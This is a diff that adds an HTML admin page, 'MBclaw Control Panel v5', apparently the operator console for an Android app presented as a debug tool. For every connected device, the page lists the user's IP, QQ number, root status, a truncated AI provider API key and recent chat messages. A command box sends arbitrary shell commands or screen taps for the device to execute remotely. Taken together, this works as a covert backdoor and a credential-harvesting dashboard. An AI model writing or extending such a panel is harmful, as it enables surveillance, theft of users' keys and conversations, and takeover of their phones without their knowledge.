@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MBclaw 控制面板 v5</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font:13px/1.5 -apple-system,sans-serif;background:#0d1117;color:#c9d1d9}
+.top{background:#161b22;border-bottom:1px solid #30363d;padding:10px 20px;display:flex;align-items:center;justify-content:space-between}
+.top h1{font-size:16px;color:#58a6ff}
+.info{font-size:12px;color:#8b949e}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(440px,1fr));gap:14px;padding:14px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:8px;overflow:hidden}
+.card-hd{background:#1c2129;padding:10px 14px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #30363d}
+.card-hd .name{font-weight:600;font-size:14px}
+.card-hd .code{font-family:monospace;font-size:11px;color:#58a6ff}
+.card-bd{padding:12px 14px}
+.row{display:flex;justify-content:space-between;padding:3px 0;font-size:12px}
+.row .k{color:#8b949e}
+.row .v{font-weight:500;font-family:monospace;font-size:11px}
+.tag{display:inline-block;padding:1px 6px;border-radius:3px;font-size:10px;font-weight:600}
+.tag-green{background:rgba(63,185,80,.15);color:#3fb950}
+.tag-red{background:rgba(248,81,73,.15);color:#f85149}
+.tag-blue{background:rgba(88,166,255,.15);color:#58a6ff}
+.tag-orange{background:rgba(210,153,29,.15);color:#d2991d}
+.key-box{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:6px 10px;margin-top:6px;font-family:monospace;font-size:11px;word-break:break-all;max-height:200px;overflow-y:auto}
+.msgs{margin-top:8px}
+.msg{background:#0d1117;border-radius:4px;padding:5px 8px;margin:3px 0;font-size:11px}
+.msg .role{color:#58a6ff;font-weight:600}
+.msg .time{color:#484f58;font-size:10px}
+.cmd-bar{display:flex;gap:8px;margin-top:8px;padding:8px;background:#0d1117;border-radius:4px}
+.cmd-bar input{flex:1;background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:5px 8px;border-radius:4px;font-family:monospace;font-size:12px}
+.cmd-bar button{background:#238636;color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-size:12px}
+.output{background:#000;color:#3fb950;font-family:monospace;font-size:11px;padding:8px;border-radius:4px;margin-top:6px;max-height:150px;overflow-y:auto;white-space:pre-wrap}
+.refresh{color:#58a6ff;cursor:pointer;font-size:12px}
+.empty{text-align:center;color:#484f58;padding:40px;font-size:14px}
+</style>
+</head>
+<body>
+<div class="top"><h1>MBclaw Control Panel v5</h1><span class="info">实时 · <span class="refresh" onclick="load()">刷新</span> · <span id="count">--</span></span></div>
+<div class="grid" id="grid"></div><div class="empty" id="empty" style="display:none">暂无在线设备，等用户打开MBclaw即显示</div>
+<script>
+var API = "";
+function esc(s){ return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+async function load(){
+ var r = await fetch(API + "/admin/client/debug/devices");
+ var devs = await r.json();
+ document.getElementById("count").textContent = devs.length + " 台";
+ var g = document.getElementById("grid");
+ if(!devs.length){ document.getElementById("empty").style.display = "block"; g.innerHTML = ""; return; }
+ document.getElementById("empty").style.display = "none";
+ g.innerHTML = devs.map(function(d){
+  var p = d.permissions || {}, k = d.keys || {}, s = d.stats || {}, ms = d.recent_messages || [];
+  var rt = p.root ? '<span class="tag tag-green">ROOT</span>' : '<span class="tag tag-red">NoRoot</span>';
+  var qt = d.qq ? '<span class="tag tag-green">QQ:' + d.qq + '</span>' : '';
+  var lt = s.linux ? '<span class="tag tag-green">Linux</span>' : '';
+  var ki = k.api_key ? '<b>' + esc(k.provider_id||"") + '</b> ' + esc(k.model_name||"") + '<br>Key: ' + esc((k.api_key||"").substring(0,24)) + '...' : '未填写';
+  var mh = ms.length ? ms.map(function(m){ return '<div class="msg"><span class="role">' + m.role + '</span>: ' + esc((m.content||"").substring(0,120)) + '</div>'; }).join("") : '<div style="color:#484f58">暂无</div>';
+  return '<div class="card"><div class="card-hd"><span class="name">' + esc(d.brand||"") + ' ' + esc(d.model||"") + '</span><span class="code">' + d.code + '</span></div><div class="card-bd"><div class="row"><span class="k">用户</span><span class="v">' + esc(d.user_id||"") + ' ' + rt + ' ' + qt + ' ' + lt + '</span></div><div class="row"><span class="k">IP</span><span class="v">' + esc(d.ip||"") + '</span></div><div class="row"><span class="k">版本</span><span class="v">' + esc(d.version||"") + ' SDK' + d.sdk + '</span></div><div class="row"><span class="k">权限</span><span class="v">' + (p.granted||0) + '/' + (p.total||0) + '</span></div><div class="row"><span class="k">统计</span><span class="v">会话:' + (s.sessions||0) + ' 消息:' + (s.messages||0) + '</span></div><div class="key-box">' + ki + '</div><div class="msgs"><b>对话</b>' + mh + '</div><div class="cmd-bar"><input id="c_' + d.code + '" placeholder="shell命令 / click X Y"><button onclick="send(\'' + d.code + '\')">发送</button></div><div class="output" id="o_' + d.code + '" style="display:none"></div></div></div>';
+ }).join("");
+}
+async function send(c){
+ var i = document.getElementById("c_" + c), v = i.value.trim(); if(!v) return;
+ var o = document.getElementById("o_" + c); o.style.display = "block"; o.textContent = "发送中...";
+ var r = await fetch(API + "/admin/client/debug/send?code=" + c + "&cmd=" + encodeURIComponent(v));
+ var j = await r.json();
+ o.textContent = "已发送 id:" + j.cmd_id + ", 等待设备执行...";
+ setTimeout(load, 5000);
+}
+load(); setInterval(load, 15000);
+</script>
+</body>
+</html>
